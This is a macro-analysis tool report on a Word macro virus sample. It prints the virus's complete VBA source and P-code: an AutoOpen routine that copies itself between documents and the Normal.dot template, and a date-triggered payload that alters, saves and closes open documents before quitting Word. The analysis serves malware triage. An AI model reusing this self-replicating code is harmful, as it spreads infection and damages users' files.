olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nottice.am
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nottice.am - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nottice.am - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Star"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Application.Options.VirusProtection = True

WordBasic.Call "STAR"
Dim D$
On Error GoTo ControlErrors
WordBasic.DisableAutoMacros 0
D$ = UCase(Right$(WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If D$ = "NORMAL.DOT" Then
 If insideDoc = 0 Then killDOC
Else
 If insideGlobal = 0 Then killGlobal
End If
ControlErrors:
End Sub
Private Function insideDoc()
Dim i
insideDoc = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "STAR" Then
                             insideDoc = 1
        End If
    Next i
End If
End Function
Private Function insideGlobal()
Dim i
insideGlobal = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "STAR" Then
                             insideGlobal = 1
        End If
    Next i
End If
End Function
Private Sub killDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:STAR", WordBasic.[FileName$]() + ":STAR"
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub killGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":STAR", "Global:STAR"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO STAR.bas 
in file: ./Virus.MSWord.Nottice.am - OLE stream: 'Macros/VBA/STAR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Star"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.STAR.MAIN"
 If (WordBasic.Day(WordBasic.Now()) = 5) Or (WordBasic.Day(WordBasic.Now()) = 20) Or (WordBasic.Day(WordBasic.Now()) = 30) Then
  Application.OnTime When:=Now + TimeValue("00:05:00"), Name:="STAR.PaintStar"
 End If
End Sub
Sub PaintStar()
Attribute PaintStar.VB_Description = "Star"
Attribute PaintStar.VB_ProcData.VB_Invoke_Func = "Normal.STAR.PaintStar"
Dim Vx, Vy, W, H
On Error GoTo FatalError
Application.WindowState = wdWindowStateMinimize
For Each Docu In Documents
 Docu.PageSetup.PaperSize = wdPaperA4Small
 Docu.PageSetup.Orientation = wdOrientLandscape
 W = Int(Docu.PageSetup.PageWidth / 2)
 H = Int(Docu.PageSetup.PageHeight / 2)
 For i = 0 To 6.28 Step 0.6
   Vx = W + Int((200 * Sin(i))): Vy = H - Int((200 * Cos(i)))
  With Docu.Shapes.AddShape(msoShape5pointStar, Vx, Vy, 50, 50).Fill
   .ForeColor.RGB = RGB(0, 0, 255)
   .BackColor.RGB = RGB(0, 0, 255)
  End With
  Beep
 Next i
 Docu.Save
Next Docu
For Each Docu In Documents
 Docu.Close
Next Docu
FatalError:
 Application.Quit SaveChanges:=wdDotNoSaveChanges
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nottice.am
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoOpen - 3185 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #3:
' Line #4:
' 	LitStr 0x0004 "STAR"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #5:
' 	Dim 
' 	VarDefn D
' Line #6:
' 	OnError ControlErrors 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Right$ 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St D$ 
' Line #9:
' 	Ld D$ 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld insideDoc 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall killDOC 0x0000 
' 	EndIf 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	Ld insideGlobal 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall killGlobal 0x0000 
' 	EndIf 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Label ControlErrors 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Function insideDoc())
' Line #17:
' 	Dim 
' 	VarDefn i
' Line #18:
' 	LitDI2 0x0000 
' 	St insideDoc 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0004 "STAR"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St insideDoc 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndFunc 
' Line #27:
' 	FuncDefn (Private Function insideGlobal())
' Line #28:
' 	Dim 
' 	VarDefn i
' Line #29:
' 	LitDI2 0x0000 
' 	St insideGlobal 
' Line #30:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0004 "STAR"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	St insideGlobal 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Private Sub killDOC())
' Line #39:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #40:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #41:
' 	LitStr 0x000B "Global:STAR"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":STAR"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Private Sub killGlobal())
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #46:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":STAR"
' 	Add 
' 	LitStr 0x000B "Global:STAR"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #48:
' 	EndSub 
' Macros/VBA/STAR - 2734 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #2:
' 	Ld Now 
' 	LitStr 0x0008 "00:05:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000E "STAR.PaintStar"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #3:
' 	EndIfBlock 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Sub PaintStar())
' Line #6:
' 	Dim 
' 	VarDefn Vx
' 	VarDefn Vy
' 	VarDefn W
' 	VarDefn H
' Line #7:
' 	OnError FatalError 
' Line #8:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #9:
' 	StartForVariable 
' 	Ld Docu 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #10:
' 	Ld wdPaperA4Small 
' 	Ld Docu 
' 	MemLd PageSetup 
' 	MemSt PaperSize 
' Line #11:
' 	Ld wdOrientLandscape 
' 	Ld Docu 
' 	MemLd PageSetup 
' 	MemSt Orientation 
' Line #12:
' 	Ld Docu 
' 	MemLd PageSetup 
' 	MemLd PageWidth 
' 	LitDI2 0x0002 
' 	Div 
' 	FnInt 
' 	St W 
' Line #13:
' 	Ld Docu 
' 	MemLd PageSetup 
' 	MemLd PageHeight 
' 	LitDI2 0x0002 
' 	Div 
' 	FnInt 
' 	St H 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitR8 0x851F 0x51EB 0x1EB8 0x4019 
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	ForStep 
' Line #15:
' 	Ld W 
' 	LitDI2 0x00C8 
' 	Ld i 
' 	ArgsLd Sin 0x0001 
' 	Mul 
' 	Paren 
' 	FnInt 
' 	Add 
' 	St Vx 
' 	BoS 0x0000 
' 	Ld H 
' 	LitDI2 0x00C8 
' 	Ld i 
' 	ArgsLd Cos 0x0001 
' 	Mul 
' 	Paren 
' 	FnInt 
' 	Sub 
' 	St Vy 
' Line #16:
' 	StartWithExpr 
' 	Ld msoShape5pointStar 
' 	Ld Vx 
' 	Ld Vy 
' 	LitDI2 0x0032 
' 	LitDI2 0x0032 
' 	Ld Docu 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	With 
' Line #17:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ForeColor 
' 	MemSt RSet 
' Line #18:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith BackColor 
' 	MemSt RSet 
' Line #19:
' 	EndWith 
' Line #20:
' 	ArgsCall Beep 0x0000 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld Docu 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	StartForVariable 
' 	Ld Docu 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	StartForVariable 
' 	Ld Docu 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #25:
' 	Ld Docu 
' 	ArgsMemCall Close 0x0000 
' Line #26:
' 	StartForVariable 
' 	Ld Docu 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Label FatalError 
' Line #28:
' 	Ld wdDotNoSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

